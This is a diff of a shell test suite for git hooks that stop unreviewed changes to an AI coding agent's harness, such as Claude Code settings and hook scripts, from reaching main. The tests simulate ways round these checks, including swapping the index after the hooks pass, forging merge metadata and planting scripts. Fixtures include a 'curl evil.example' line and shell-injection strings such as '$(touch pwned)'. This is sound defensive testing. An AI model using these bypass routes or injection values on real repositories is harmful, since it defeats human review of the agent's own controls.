-in_i git merge -q --no-ff settings >/dev/null 2>&1 && fail "a plain merge took a change of Claude Code's settings (F129)"
-git -C "$i" merge --abort
-for mark in "$base" ''; do
-	in_i env GNOWORLD_MERGE="$mark" git merge -q --no-ff planted >/dev/null 2>&1 && fail "a merge took the mark '$mark' (F129)"
-	git -C "$i" merge --abort
-done
-in_i git merge -q --no-ff --no-commit planted >/dev/null 2>&1 || :
-in_i git commit -qm "Merge branch 'planted'" >/dev/null 2>&1 && fail "a merge concluded by hand took harness changes merge.sh did not show (F129)"
-git -C "$i" merge --abort
-# What is committed is the index: a harness file kept there, gone from the disk, still counts.
-in_i git merge -q --no-ff --no-commit settings >/dev/null 2>&1 || :
-rm "$i/.claude/settings.json"
-in_i git commit -qm "Merge branch 'settings'" >/dev/null 2>&1 && fail "a merge took a harness change kept in the index only (F129)"
-git -C "$i" merge --abort
-# A squash merge writes the branch's files too, and leaves an ordinary commit to make: git
-# refuses it once fast-forwards are off, and if it ran, the commit is refused.
-in_i git merge -q --squash settings >/dev/null 2>&1 && fail "git took a squash merge with fast-forwards off"
-in_i git -c merge.ff=true merge -q --squash settings >/dev/null 2>&1 || fail "the squash merge, allowed, did not run"
-[ -e "$i/.git/SQUASH_MSG" ] || fail "the squash merge left no message to commit"
-in_i git commit -qm "chore: squash settings" >"$t/out" 2>&1 && fail "a squash merge took harness changes merge.sh did not show (F129)"
-grep -q 'git reset --hard' "$t/out" || fail "pre-commit told Alexis to abort a squash with git merge --abort, which cannot (F154)"
-git -C "$i" reset -q --hard "$base"
-rm -f "$i/.git/SQUASH_MSG"
-ran "a refused merge"
-in_i git merge -q --no-ff feature >/dev/null 2>&1 || fail "a merge with no harness change wanted merge.sh"
-# Every merge's ledgers conflict (9n): merge.sh's merge stops on them and prints the line that concludes it with its mark;
-# once the ledger is resolved by hand, the merge is committed if every harness file is as git merge-tree merges the commit
-# shown, none in conflict. Each refusal says why and how to undo the merge.
-conflicted() { # <main's side> <branch> [squash]: main reset to the first, the second merged with its mark, stopped on its conflict, the ledger resolved
-	git -C "$i" reset -q --hard "$1"
-	rm -f "$i/.git/SQUASH_MSG"
-	tip=$(git -C "$i" rev-parse "$2")
-	if [ -n "${3:-}" ]; then
-		in_i env GNOWORLD_MERGE="$tip" git -c merge.ff=true merge -q --squash "$tip" >/dev/null 2>&1 && fail "the squash of $2 did not stop on its conflict"
-	else
-		in_i env GNOWORLD_MERGE="$tip" git merge -q --no-ff "$tip" >/dev/null 2>&1 && fail "the merge of $2 did not stop on its conflict"
-	fi
-	[ ! -e "$i/docs/decisions.md" ] || { echo both >"$i/docs/decisions.md" && git -C "$i" add docs/decisions.md; }
-}
-concluded() { # [mark]: the merge committed with the mark, merge.sh's by default, the gate's record made for its tree first
-	mark_i "$(git -C "$i" write-tree)" fast
-	in_i env GNOWORLD_MERGE="${1-$tip}" git commit -q --no-edit >"$t/out" 2>&1
-}
-refused() { # <why> <what the refusal names> [mark]
-	concluded "${3-$tip}" && fail "$1"
-	grep -qF -- "$2" "$t/out" && grep -qF 'git merge --abort' "$t/out" || { cat "$t/out" >&2; fail "pre-commit refused for another reason than it should: $1"; }
-}
-# merge.sh stops on the ledger's conflict and waits; once it is resolved and Enter is pressed, it commits the merge itself, so
-# no mark is ever typed (9n's review): Enter before the resolution commits nothing and asks again; no more keys, nothing.
-# What it commits is checked after the commit: its first parent the branch merged onto as it was shown, its second the commit
-# shown, no third, its harness the merge shown, and its message merge.sh's own; else it is undone (9n's /pre-merge).
-trap '' PIPE # a merge.sh that stopped reading fails the test below, not the suite by a signal
-key() { printf '%s\n' "$1" >&3 || { cat "$t/out" >&2; fail "merge.sh stopped reading its keys before the merge was committed (9n)"; }; }
-said() { # <what merge.sh says>: waits until it says it, 30 s at most
-	w=0
-	until grep -q "$1" "$t/out" 2>/dev/null; do
-		w=$((w + 1))
-		[ "$w" -lt 300 ] || { cat "$t/out" >&2; fail "merge.sh never said: $1"; }
-		sleep 0.1
-	done
-}
-waiting() { # <branch>: merge.sh merges it onto main, reset to ledger-main, its keys from this test, git from $wpath first; it stops on the ledger
-	git -C "$i" reset -q --hard ledger-main
-	start=$(git -C "$i" rev-parse HEAD)
-	tip=$(git -C "$i" rev-parse "$1")
-	rm -f "$t/keys" "$t/status"
-	mkfifo "$t/keys"
-	(cd "$i" && alexis env PATH="${wpath:-$PATH}" sh .git/hooks/merge.sh "$1" <"$t/keys" >"$t/out" 2>&1; echo $? >"$t/status") &
-	exec 3>"$t/keys"
-	key "$1"
-	said '^merge\.sh: .*press Enter'
-}
-resolved() {
-	echo both >"$i/docs/decisions.md"
-	git -C "$i" add docs/decisions.md
-	mark_i "$(git -C "$i" write-tree)" fast
-}
-ended() { # Enter once more, then no more keys; merge.sh's exit status in $t/status (not in a $(...): its wait has no child)
-	key ''
-	exec 3>&-
-	wait
-}
-status() { cat "$t/status"; }
-waiting ledger
-grep -q 'GNOWORLD_MERGE=' "$t/out" && fail "merge.sh told Alexis to type a mark, which anyone can write for any merge (9n's review)"
-key ''
-said '^merge\.sh: not committed'
-# During the wait the branch moves, and .git/MERGE_MSG is rewritten: the commit shown is merged, with merge.sh's message.
-git -C "$i" branch -f ledger clash
-printf "Merge branch 'ledger'\n\nHarness-changed: .githooks/pre-push - planted\n" >"$i/.git/MERGE_MSG"
-resolved
-ended
-[ "$(status)" = 0 ] || { cat "$t/out" >&2; fail "merge.sh did not commit a merge whose ledger was resolved by hand (9n)"; }
-git -C "$i" branch -f ledger "$tip"
-[ "$(git -C "$i" rev-parse HEAD^2)" = "$tip" ] || fail "merge.sh's merge is not the merge of the commit shown, the branch moved since (9n's /pre-merge)"
-git -C "$i" log -1 --format=%B HEAD | grep -q planted && fail "merge.sh committed a message a session wrote in .git/MERGE_MSG (9n's /pre-merge)"
-git -C "$i" show HEAD:.githooks/pre-push | grep -qx '# main, at the top' || fail "the merge lost main's side of a harness file both changed (9n's review)"
-git -C "$i" show HEAD:.githooks/pre-push | grep -qx '# shown' && [ "$(git -C "$i" show HEAD:docs/decisions.md)" = both ] ||
-	fail "the merge concluded did not hold the harness shown and the ledger as resolved (9n)"
-# A third parent written into .git/MERGE_HEAD, the branch moved under the merge, or the harness swapped after the hooks
-# passed (a FIFO can hold pre-commit while the index is replaced): merge.sh undoes the commit (9n's /pre-merge).
-waiting ledger
-resolved
-echo "$base" >>"$i/.git/MERGE_HEAD"
-ended
-[ "$(status)" != 0 ] || fail "merge.sh kept a merge with a third parent (9n's /pre-merge)"
-[ "$(git -C "$i" rev-parse HEAD)" = "$start" ] && grep -q 'not the merge you saw' "$t/out" || { cat "$t/out" >&2; fail "merge.sh did not undo a merge with a third parent (9n's /pre-merge)"; }
-waiting ledger
-resolved
-# main moves to a commit of the same tree, which pre-commit cannot tell from the one shown
-git -C "$i" update-ref refs/heads/main "$(git -C "$i" commit-tree "$start^{tree}" -p "$start" -m moved)"
-ended
-[ "$(status)" != 0 ] || fail "merge.sh kept a merge onto a branch moved during the wait (9n's /pre-merge)"
-[ "$(git -C "$i" rev-parse HEAD)" = "$start" ] && grep -q 'not the merge you saw' "$t/out" || { cat "$t/out" >&2; fail "merge.sh did not undo a merge onto a branch moved during the wait (9n's /pre-merge)"; }
-waiting ledger
-resolved
-# .git/MERGE_HEAD replaced by a commit of the same tree as the one shown, which pre-commit cannot tell apart
-git -C "$i" commit-tree "$tip^{tree}" -p "$tip" -m other >"$i/.git/MERGE_HEAD"
-ended
-[ "$(status)" != 0 ] || fail "merge.sh kept a merge of another commit than the one shown (9n's /pre-merge)"
-[ "$(git -C "$i" rev-parse HEAD)" = "$start" ] && grep -q 'not the merge you saw' "$t/out" || { cat "$t/out" >&2; fail "merge.sh did not undo a merge of another commit than the one shown (9n's /pre-merge)"; }
-mkdir -p "$t/swapping"
-cat >"$t/swapping/git" <<EOF
-#!/bin/sh
-"$real_git" "\$@" || exit
-[ "\$1" = commit ] || exit 0
-# The index alone, as a hook held on a FIFO lets a session swap it; the disk keeps the merged file (9n's /pre-merge, round 2).
-swapped=\$({ "$real_git" show :.githooks/pre-push && echo '# swapped after the hooks'; } | "$real_git" hash-object -w --stdin)
-"$real_git" update-index --cacheinfo "\$("$real_git" ls-files -s .githooks/pre-push | cut -d' ' -f1),\$swapped,.githooks/pre-push"
-swapped=\$("$real_git" commit-tree "\$("$real_git" write-tree)" -p HEAD^1 -p HEAD^2 -m swapped)
-"$real_git" update-ref HEAD "\$swapped"
-EOF
-chmod +x "$t/swapping/git"
-wpath="$t/swapping:$PATH" waiting ledger
-resolved
-ended
-[ "$(status)" != 0 ] || fail "merge.sh kept a merge whose harness was swapped after the hooks (9n's /pre-merge)"
-[ "$(git -C "$i" rev-parse HEAD)" = "$start" ] && grep -q 'not the merge you saw' "$t/out" || { cat "$t/out" >&2; fail "merge.sh did not undo a merge whose harness was swapped after the hooks (9n's /pre-merge)"; }
-wpath=
-trap - PIPE
-git -C "$i" reset -q --hard ledger-main
-echo ledger | in_i sh .git/hooks/merge.sh ledger >"$t/out" 2>&1 && fail "merge.sh committed a merge in conflict with no key pressed"
-grep -q '^merge\.sh: nothing committed' "$t/out" && [ -e "$i/.git/MERGE_HEAD" ] || { cat "$t/out" >&2; fail "merge.sh did not leave the merge in conflict to undo (9n)"; }
-git -C "$i" merge --abort
-# Before merging, merge.sh shows what the merge does to this branch's harness, git merge-tree's tree with HEAD's attributes,
-# not what the branch changed: a rename on this side carries the branch's edit into the harness, a file/directory conflict
-# moves a harness file out of it, two merge bases make HEAD...tip read one of them (9n's /pre-merge). A harness file that
-# would be in conflict has no resolution that was shown: refused before merging.
-git -C "$i" reset -q --hard clash-main
-mark_i "$(git -C "$i" write-tree)" fast
-echo clash | in_i sh .git/hooks/merge.sh clash >"$t/out" 2>&1 && fail "merge.sh merged a harness file in conflict (9n's review)"
-grep -q 'would be in conflict' "$t/out" && grep -qx '.githooks/pre-push' "$t/out" || { cat "$t/out" >&2; fail "merge.sh refused a harness conflict without naming it (9n's review)"; }
-grep -q 'press Enter' "$t/out" && fail "merge.sh waited on a merge whose harness is in conflict (9n's /pre-merge)"
-untouched_main "$(git -C "$i" rev-parse clash-main)" || fail "merge.sh began a merge whose harness would conflict (9n's review)"
-git -C "$i" reset -q --hard moved-main
-mark_i "$(git -C "$i" merge-tree --write-tree moved-main edit)" fast
-echo wrong | in_i sh .git/hooks/merge.sh edit >"$t/out" 2>&1 && fail "merge.sh merged, unshown, a change a rename carries into the harness (9n's /pre-merge, F6077)"
-grep -qx 'scripts/y.sh' "$t/out" && grep -q '^+curl evil.example' "$t/out" || { cat "$t/out" >&2; fail "merge.sh did not show the change a rename carries into the harness (9n's /pre-merge, F6077)"; }
-untouched_main "$(git -C "$i" rev-parse moved-main)" || fail "merge.sh began a merge on a wrong answer"
-git -C "$i" reset -q --hard nvmrc-main
-echo wrong | in_i sh .git/hooks/merge.sh nvmrc-dir >"$t/out" 2>&1 && fail "merge.sh merged on a wrong answer"
-grep -qx '.nvmrc' "$t/out" && grep -q '^-22' "$t/out" || { cat "$t/out" >&2; fail "merge.sh did not show a harness file a file/directory conflict moves away (9n's /pre-merge)"; }
-untouched_main "$(git -C "$i" rev-parse nvmrc-main)" || fail "merge.sh began a merge on a wrong answer"
-# .git/info/attributes, .git/info/grafts and .git/shallow change how git merges whatever the trees hold, and Claude's sandbox
-# can write them: merge.sh refuses to merge while any holds anything (9n's /pre-merge, rounds 1 and 2).
-for f in info/attributes info/grafts shallow; do
-	git -C "$i" reset -q --hard clash-main
-	case $f in info/attributes) echo '.githooks/* merge=union' ;; *) git -C "$i" rev-parse clash-main ;; esac >"$i/.git/$f"
-	mark_i "$(git -C "$i" merge-tree --write-tree clash-main clash)" fast
-	echo clash | in_i sh .git/hooks/merge.sh clash >"$t/out" 2>&1 && fail "merge.sh merged with .git/$f set (9n's /pre-merge)"
-	grep -q ".git/$f" "$t/out" || { cat "$t/out" >&2; fail "merge.sh refused .git/$f for another reason (9n's /pre-merge)"; }
-	untouched_main "$(git -C "$i" rev-parse clash-main)" || fail "merge.sh began a merge with .git/$f set"
-	rm "$i/.git/$f"
-done
-# .git/info/attributes and .git/info/grafts change how git merged: pre-commit refuses a merge of the harness while either
-# holds anything, and reads the merge with HEAD's attributes, whatever a .gitattributes the merge wrote says (9n's /pre-merge).
-for f in info/attributes info/grafts shallow; do
-	conflicted ledger-main ledger
-	case $f in info/attributes) echo 'docs/* merge=union' ;; *) git -C "$i" rev-parse ledger-main ;; esac >"$i/.git/$f"
-	refused "a merge of the harness took .git/$f set (9n's /pre-merge)" ".git/$f"
-	rm "$i/.git/$f"
-done
-conflicted clash-main union
-git -C "$i" show "$(git -C "$i" merge-tree --write-tree clash-main union | sed -n 1p)":.githooks/pre-push >"$i/.githooks/pre-push"
-git -C "$i" add .githooks/pre-push
-refused "a merge took a harness file in conflict, resolved as the branch's .gitattributes merge it (9n's /pre-merge)" "in conflict"
-conflicted ledger-main ledger
-concluded "$tip" || { cat "$t/out" >&2; fail "a merge with its mark, its ledger resolved, was refused (9n)"; }
-conflicted ledger-main ledger
-mark_i "$(git -C "$i" write-tree)" fast
-in_i env GNOWORLD_MERGE="$tip" git commit -qa --no-edit >"$t/out" 2>&1 || { cat "$t/out" >&2; fail "a merge resolved and committed with -a was refused (9n)"; }
-conflicted ledger-main ledger squash
-mark_i "$(git -C "$i" write-tree)" fast
-in_i env GNOWORLD_MERGE="$tip" git commit -qm "chore: squash ledger" >"$t/out" 2>&1 || { cat "$t/out" >&2; fail "a squash with merge.sh's mark, its ledger resolved, was refused (9n)"; }
-# The mark: missing, or naming no commit, or another commit than the one merged.
-orphan=$(git -C "$i" commit-tree -m orphan "$(git -C "$i" mktree </dev/null)")
-for mark in '' nonsense "$orphan" "$(git -C "$i" rev-parse 'ledger^{tree}')"; do
-	conflicted ledger-main ledger
-	refused "a merge in conflict took the mark '$mark' (F129)" "names no commit merge.sh showed" "$mark"
-	grep -qF 'sh .git/hooks/merge.sh <branch>' "$t/out" || fail "pre-commit refused the mark '$mark' without saying how to redo the merge (F129)"
-done
-conflicted ledger-main ledger
-refused "a merge in conflict concluded with no mark took harness changes (F129)" "names no commit merge.sh showed" ''
-conflicted ledger-main ledger
-refused "a merge in conflict took the mark of the commit before it (F129)" ".githooks/pre-push" "$base"
-# Every harness file, as committed: changed, added, deleted or made executable during the resolution, the index's copy
-# whatever the disk holds, and what commit -a stages.
-conflicted ledger-main ledger
-echo '# changed after the merge' >>"$i/.githooks/pre-push"
-git -C "$i" add .githooks/pre-push
-refused "a merge took a harness file changed after merge.sh showed it (9n)" ".githooks/pre-push"
-conflicted ledger-main ledger
-echo '# stray' >>"$i/.githooks/commit-msg"
-git -C "$i" add .githooks/commit-msg
-refused "a merge took a harness file it does not change, changed during the resolution (9n)" ".githooks/commit-msg"
-conflicted ledger-main ledger
-echo 'echo evil' >"$i/scripts/evil.sh"
-git -C "$i" add scripts/evil.sh
-refused "a merge took a harness file added during the resolution (9n)" "scripts/evil.sh"
-conflicted ledger-main ledger
-git -C "$i" rm -q .githooks/commit-msg
-refused "a merge took a harness file deleted during the resolution (9n)" ".githooks/commit-msg"
-conflicted ledger-main ledger
-chmod +x "$i/scripts/gitleaks.toml"
-git -C "$i" add scripts/gitleaks.toml
-refused "a merge took a harness file made executable during the resolution (9n)" "scripts/gitleaks.toml"
-conflicted ledger-main ledger
-echo '# in the index alone' >>"$i/.githooks/commit-msg"
-git -C "$i" add .githooks/commit-msg
-git -C "$i" show HEAD:.githooks/commit-msg >"$i/.githooks/commit-msg"
-refused "a merge took a harness file changed in the index alone, the disk as merged (9n)" ".githooks/commit-msg"
-conflicted ledger-main ledger
-echo '# not staged' >>"$i/.githooks/commit-msg"
-git -C "$i" add .githooks/commit-msg
-mark_i "$(git -C "$i" write-tree)" fast
-git -C "$i" reset -q -- .githooks/commit-msg
-in_i env GNOWORLD_MERGE="$tip" git commit -qa --no-edit >"$t/out" 2>&1 && fail "a merge committed with -a took a harness file changed on the disk (9n)"
-grep -qF .githooks/commit-msg "$t/out" || { cat "$t/out" >&2; fail "pre-commit refused a commit -a's harness file for another reason (9n)"; }
-# A harness file in conflict, whatever the resolution keeps: a content conflict's markers, the side git left of a file
-# one side deleted, the deletion, a file both sides added, named with a capital or matched by a glob; a squash too.
-conflicted clash-main clash
-grep -q '^>>>>>>>' "$i/.githooks/pre-push" || fail "the clash's merge left no conflict in the harness file"
-git -C "$i" add .githooks/pre-push
-refused "a merge took a harness file in conflict, its markers kept (9n)" "in conflict"
-conflicted gone ledger
-git -C "$i" add .githooks/pre-push
-refused "a merge took a harness file main deleted and the branch changed, kept as git left it (9n)" "in conflict"
-conflicted clash-main gone
-git -C "$i" rm -q .githooks/pre-push
-refused "a merge took a harness file the branch deleted and main changed, deleted at the resolution (9n)" "in conflict"
-for n in 1 2 3 4; do
-	conflicted "twin-main-$n" "twin-branch-$n"
-	p=$(git -C "$i" diff --name-only --diff-filter=U)
-	[ -n "$p" ] || fail "twin $n left no conflict"
-	git -C "$i" add -- "$p"
-	refused "a merge took $p, added on both sides, in conflict, its markers kept (9n)" "in conflict"
-done
-conflicted clash-main clash squash
-git -C "$i" add .githooks/pre-push
-mark_i "$(git -C "$i" write-tree)" fast
-in_i env GNOWORLD_MERGE="$tip" git commit -qm "chore: squash clash" >"$t/out" 2>&1 && fail "a squash took a harness file in conflict (9n)"
-grep -qF 'in conflict' "$t/out" || { cat "$t/out" >&2; fail "pre-commit refused the squash's conflict for another reason (9n)"; }
-# The other files are resolved by hand, and their code still needs the gate's record: written during the resolution,
-# with no record, or after the record was made.
-conflicted ledger-main ledger
-echo 'export const evil = 1;' >"$i/evil.ts"
-git -C "$i" add evil.ts
-in_i env GNOWORLD_MERGE="$tip" git commit -q --no-edit >"$t/out" 2>&1 && fail "a merge took code written during the resolution, which no gate passed (9n)"
-grep -q 'no gate passed' "$t/out" || { cat "$t/out" >&2; fail "pre-commit refused unchecked code in a merge for another reason (9n)"; }
-conflicted ledger-main ledger
-mark_i "$(git -C "$i" write-tree)" fast
-echo 'export const evil = 1;' >"$i/evil.ts"
-git -C "$i" add evil.ts
-in_i env GNOWORLD_MERGE="$tip" git commit -q --no-edit >"$t/out" 2>&1 && fail "a merge took code written after the gate passed (9n)"
-grep -q 'no gate passed' "$t/out" || { cat "$t/out" >&2; fail "pre-commit refused late code in a merge for another reason (9n)"; }
-git -C "$i" reset -q --hard "$base"
-mkdir -p "$i/docs"
-ran "a merge in conflict"
-# pre-push wants .git/hooks to hold the hooks of the main it pushes, checked by the install
-# script beside it: what runs is what was reviewed.
-git -C "$i" reset -q --hard "$base"
-mark_i tweak full
-# The hooks checked are those of the commit pushed as main, not the local main's: tweak, with its
-# gate and review, pushed as main from tweak.
-git -C "$i" checkout -q tweak
-p=$(cd "$i" && . .git/hooks/records.sh && review_print HEAD)
-echo "2026-10-18 $p test" >"$i/docs/review-passes.txt"
-git -C "$i" add docs
-in_i git commit -qm "docs: pass" >/dev/null 2>&1 || fail "pre-commit refused a review pass"
-printf 'refs/heads/tweak %s refs/heads/main %s\n' "$(git -C "$i" rev-parse HEAD)" "$base" | in_i sh .git/hooks/pre-push origin url >/dev/null 2>&1 &&
-	fail "pre-push let a branch leave as main with hooks not installed from it (F129)"
-git -C "$i" checkout -q main
-echo tweak | in_i sh .git/hooks/merge.sh tweak >/dev/null 2>&1 || fail "merge.sh refused a declared harness change"
-push_i() { printf 'refs/heads/main %s refs/heads/main %s\n' "$(git -C "$i" rev-parse HEAD)" "$base" | in_i sh .git/hooks/pre-push origin url >/dev/null 2>&1; }
-push_i && fail "pre-push let main leave with hooks not installed from it (F129)"
-install
-push_i || fail "pre-push refused main once its hooks were installed"
-mv "$i/.git/hooks/install_hooks.sh" "$t/install_hooks.sh"
-push_i && fail "pre-push let main leave with nothing to check its hooks"
-mv "$t/install_hooks.sh" "$i/.git/hooks/"
+git -C "$i" branch leaky "$leaky"
+in_i git merge -q leaky >/dev/null 2>&1 && fail "a merge took a key a branch brings: pre-merge-commit scans nothing"
+git -C "$i" merge --abort 2>/dev/null || :
+[ "$(git -C "$i" rev-parse HEAD)" = "$base" ] || fail "a merge fast-forwarded main past every hook (F129)"
+in_i git merge -q feature >/dev/null 2>&1 || fail "a merge of a clean branch was refused"
+[ "$(git -C "$i" rev-parse HEAD^2)" = "$(git -C "$i" rev-parse feature)" ] || fail "the merge of a clean branch made no merge commit"
+ran "a merge"
 fi
 
 if part check_hooks; then
@@ -3670,7 +3049,7 @@ gate_fixture() { # $1: its folder's name, one a section: the sections run side b
 g="$t/$1"
 log="$g.log"
 mkdir -p "$g/scripts" "$g/.githooks" "$g/bin" "$g/toolchain" "$g/gno/r" "$g/app/src" "$g/server/src" "$g/packages/core/src" "$g/deploy" "$g/lint" "$g/node_modules/.bin"
-cp "$here/check.sh" "$here/code_changed.sh" "$here/related.py" "$here/speeds.py" "$g/scripts/" && cp "$hooks/records.sh" "$g/.githooks/" && cp "$here/../.node-version" "$here/../.gitignore" "$g/"
+cp "$here/check.sh" "$here/related.py" "$here/speeds.py" "$g/scripts/" && cp "$hooks/records.sh" "$g/.githooks/" && cp "$here/../.node-version" "$here/../.gitignore" "$g/"
 step="$g/bin/step"
 # The one stub: it logs its name and arguments on a line; Prettier's and ESLint's arguments one a line too (a path with a space stays
 # whole, F4853); the type check's cache, and the switches the tests saw. It takes 2 s when SLOW_STEP names it, fails when FAIL does,
@@ -3732,9 +3111,7 @@ done
 git -C "$g" init -q && git -C "$g" add -A && git -C "$g" commit -qm x
 real=$(cd "$g" && pwd -P) # check.sh runs from the folder's own spelling (F081)
 }
-gate() { : >"$log" && rm -f "$log".* && (cd "$g" && env -u SANDBOX_RUNTIME -u GATE_CHANGED GATE_LOG="$log" GNO_TOOLCHAIN="$g/toolchain" NVM_DIR="${NVM_DIR:-$HOME/.nvm}" HOME="$g.home" sh scripts/check.sh "$@" 2>&1); }
-# Pre-commit's staged copy: no repository, GATE_CHANGED its list ($1).
-staged() { : >"$log" && rm -f "$log".* && (cd "$g-copy" && env -u SANDBOX_RUNTIME GATE_LOG="$log" GNO_TOOLCHAIN="$g/toolchain" NVM_DIR="${NVM_DIR:-$HOME/.nvm}" HOME="$g.home" GATE_CHANGED="$1" sh scripts/check.sh 2>&1); }
+gate() { : >"$log" && rm -f "$log".* && (cd "$g" && env -u SANDBOX_RUNTIME GATE_LOG="$log" GNO_TOOLCHAIN="$g/toolchain" NVM_DIR="${NVM_DIR:-$HOME/.nvm}" HOME="$g.home" sh scripts/check.sh "$@" 2>&1); }
 ran() { grep -q "^$1\( \|$\)" "$log"; }
 reset() { git -C "$g" reset -q --hard && git -C "$g" clean -qfd; }
 last() { printf '%s\n' "$1" | tail -n 1; }
@@ -3750,16 +3127,15 @@ handed() { sed -n '/^--$/,$p' "$log.$1-args" | sed 1d; }
 if part gate; then
 gate_fixture gate
 # Nothing changed: every tool on the whole repository, Prettier from the worktree's own cache, every test but the timing ones, every
-# realm; the code recorded, nothing left that git sees, the pass the last line.
+# realm; nothing recorded, nothing left that git sees, the pass the last line.
 out=$(gate) || fail "check.sh failed on a tree with no change: $out"
 whole "a tree with no change"
 grep -qx 'format:check --check --log-level warn \. --cache --cache-strategy content --cache-location=\.claude/tmp/prettier-cache' "$log" ||
 	fail "check.sh gave Prettier no cache in the worktree's .claude/tmp: $(grep '^format:check' "$log")"
 grep -q '^lint .*--cache' "$log" && fail "check.sh linted from a cache: one keys a file on its own text, and the typed rules read the others'"
 grep -qx 'gno lint \./\.\.\.' "$log" || fail "check.sh did not lint every realm on a tree with no change"
-grep -qxF "$(cd "$g" && . .githooks/records.sh && worktree_print)" "$g/.claude/tmp/green-fast" || fail "check.sh did not record the code it passed"
+[ ! -e "$g/.claude/tmp/green-fast" ] && [ ! -e "$g/.claude/tmp/gate-green" ] || fail "check.sh wrote a record, which no hook reads since D13173"
 grep -qx "cache=$real/.claude/tmp/tsc there" "$log.tsc" || fail "check.sh did not build the types from the worktree's own cache: $(cat "$log.tsc")"
-[ -s "$g/.claude/tmp/gate-green" ] || fail "check.sh did not write the state stop_gate.sh compares"
 [ -z "$(git -C "$g" status --porcelain)" ] || fail "check.sh left files git sees: $(git -C "$g" status --porcelain)"
 last "$out" | grep -qx 'all checks passed in [0-9]* s' || fail "a run that passed did not end on its pass line: $(last "$out")"
 # Prose alone is no change of code: checked whole, as no change.
@@ -3893,7 +3269,7 @@ mkdir -p "$t/elsewhere/objects"
 printf 'y\n' >>"$g/server/src/a.ts"
 for var in GIT_DIR GIT_WORK_TREE GIT_INDEX_FILE GIT_COMMON_DIR GIT_OBJECT_DIRECTORY; do
 	case $var in GIT_INDEX_FILE) value="$t/elsewhere/index" ;; GIT_OBJECT_DIRECTORY) value="$t/elsewhere/objects" ;; *) value="$t/elsewhere" ;; esac
-	env "$var=$value" sh -c 'cd "$1" && env -u SANDBOX_RUNTIME -u GATE_CHANGED GATE_LOG="$2" GNO_TOOLCHAIN="$1/toolchain" NVM_DIR="$3" HOME="$1.home" sh scripts/check.sh' sh "$g" "$log" "${NVM_DIR:-$HOME/.nvm}" >/dev/null 2>&1 ||
+	env "$var=$value" sh -c 'cd "$1" && env -u SANDBOX_RUNTIME GATE_LOG="$2" GNO_TOOLCHAIN="$1/toolchain" NVM_DIR="$3" HOME="$1.home" sh scripts/check.sh' sh "$g" "$log" "${NVM_DIR:-$HOME/.nvm}" >/dev/null 2>&1 ||
 		fail "check.sh failed with a caller's $var"
 	[ "$(handed lint)" = server/src/a.ts ] || fail "a caller's $var steered which change check.sh read: $(grep '^lint' "$log")"
 	: >"$log" && rm -f "$log".*
@@ -3902,23 +3278,23 @@ done
 (NODE_OPTIONS=--trace-warnings gate) >/dev/null || fail "check.sh failed with a caller's NODE_OPTIONS"
 grep -q -- '--trace-warnings.*--max-old-space-size=8192' "$log.node" || fail "check.sh dropped a caller's NODE_OPTIONS or its own heap: $(cat "$log.node")"
 reset
-# A caller's TSC_CACHE steers no type check: in a repository, the worktree's; in a staged copy, the run's own (checked below).
+# A caller's TSC_CACHE steers no type check: the worktree's own.
 (TSC_CACHE=/elsewhere gate) >/dev/null || fail "check.sh failed with a caller's TSC_CACHE"
 grep -qx "cache=$real/.claude/tmp/tsc there" "$log.tsc" || fail "a caller's TSC_CACHE steered check.sh's type check: $(cat "$log.tsc")"
 # gno runs in gno/, with the toolchain's own home, read from an absolute folder even when GNO_TOOLCHAIN is relative.
 grep -qx "gno lint home=$g/toolchain/gnohome cwd=$real/gno" "$log.gno" && grep -qx "gno test home=$g/toolchain/gnohome cwd=$real/gno" "$log.gno" || fail "check.sh ran gno elsewhere than gno/ or with another home: $(cat "$log.gno")"
 printf 'y\n' >>"$g/gno/r/a.gno"
-: >"$log" && rm -f "$log".* && (cd "$g" && env -u SANDBOX_RUNTIME -u GATE_CHANGED GATE_LOG="$log" GNO_TOOLCHAIN=toolchain NVM_DIR="${NVM_DIR:-$HOME/.nvm}" HOME="$g.home" sh scripts/check.sh >/dev/null 2>&1) ||
+: >"$log" && rm -f "$log".* && (cd "$g" && env -u SANDBOX_RUNTIME GATE_LOG="$log" GNO_TOOLCHAIN=toolchain NVM_DIR="${NVM_DIR:-$HOME/.nvm}" HOME="$g.home" sh scripts/check.sh >/dev/null 2>&1) ||
 	fail "check.sh failed with a relative GNO_TOOLCHAIN"
 grep -qx "gno test home=$real/toolchain/gnohome cwd=$real/gno" "$log.gno" || fail "check.sh did not read a relative GNO_TOOLCHAIN as an absolute folder: $(cat "$log.gno")"
 reset
 # A Node other than .node-version's is refused before any step, nvm's missing: the tools would run on it and the gate record its pass.
 mkdir -p "$t/oldnode" && printf '#!/bin/sh\necho v1.0.0\n' >"$t/oldnode/node" && chmod +x "$t/oldnode/node"
-out=$(cd "$g" && env -u SANDBOX_RUNTIME -u GATE_CHANGED GATE_LOG="$log" GNO_TOOLCHAIN="$g/toolchain" NVM_DIR=/nonexistent HOME="$g.home" PATH="$t/oldnode:$PATH" sh scripts/check.sh 2>&1) &&
+out=$(cd "$g" && env -u SANDBOX_RUNTIME GATE_LOG="$log" GNO_TOOLCHAIN="$g/toolchain" NVM_DIR=/nonexistent HOME="$g.home" PATH="$t/oldnode:$PATH" sh scripts/check.sh 2>&1) &&
 	fail "check.sh ran on another Node than .node-version's"
 printf '%s\n' "$out" | grep -q "is needed (.node-version" && [ "$(last "$out")" = "check.sh: FAILED at main:start" ] || fail "check.sh did not refuse another Node, saying so: $out"
 # The trap stops the lanes started, by an eval of their names: a caller's own `lanes`, on a run that stops before any lane, runs nothing.
-(cd "$g" && env -u SANDBOX_RUNTIME -u GATE_CHANGED pid_a=999999 lanes='a}";touch${IFS}pwned;:"${pid_a' GATE_LOG="$log" GNO_TOOLCHAIN="$g/toolchain" NVM_DIR=/nonexistent HOME="$g.home" PATH="$t/oldnode:$PATH" sh scripts/check.sh) >/dev/null 2>&1 || :
+(cd "$g" && env -u SANDBOX_RUNTIME pid_a=999999 lanes='a}";touch${IFS}pwned;:"${pid_a' GATE_LOG="$log" GNO_TOOLCHAIN="$g/toolchain" NVM_DIR=/nonexistent HOME="$g.home" PATH="$t/oldnode:$PATH" sh scripts/check.sh) >/dev/null 2>&1 || :
 [ ! -e "$g/pwned" ] || fail "a caller's lanes ran as code in check.sh's trap"
 # A name that reads as shell code reaches Vitest's related command as one argument, run as nothing (related.py quotes it).
 printf 'x\n' >"$g/server/src/a'b.ts" && printf 'x\n' >"$g/server/src/\$(touch pwned).ts"
@@ -3935,44 +3311,13 @@ for o in --full --merge --tests-all --everything --whatever; do
 	printf '%s\n' "$out" | grep -q "no option since D13168" || fail "check.sh refused $o without saying why: $out"
